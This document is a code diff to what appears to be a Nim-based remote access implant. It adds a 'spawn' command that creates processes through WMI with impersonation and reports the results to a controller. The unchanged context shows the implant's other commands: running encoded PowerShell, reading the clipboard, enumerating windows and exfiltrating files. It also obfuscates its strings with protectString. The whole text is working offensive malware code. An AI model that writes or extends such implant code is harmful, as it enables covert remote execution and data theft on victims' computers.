@@ -25,6 +25,7 @@ proc windows_parse_command*(command: JsonNode): bool
 # Command executors
 proc collect_data(): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
+proc spawn_wmi(cmdline: string): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc enum_visible_windows(): bool
@@ -148,6 +149,20 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
             protectString("output"): "\n" & output
         }.toOrderedTable()
         is_success = post_data(client, ps_module, $data)
+
+    return is_success
+
+
+proc spawn_wmi(cmdline: string): bool =
+    var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2:Win32_Process"))
+    var res = wmi.Create(cmdline)
+    var data = {
+        protectString("cmdline"): cmdline,
+        protectString("is_success"): $(res == 0),
+        protectString("result"): $res
+    }.toOrderedTable()
+    
+    var is_success = post_data(client, protectString("spawn") , $data)
 
     return is_success
 
@@ -674,6 +689,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             # ps_modules
             else:
                 is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command[protectString("ps_module")].getStr())
+        of protectString("spawn"):
+            is_success = spawn_wmi(command[protectString("cmdline")].getStr())
         of protectString("download"):
             is_success = exfil_file(client, command[protectString("src_file")].getStr())
         of protectString("upload"):
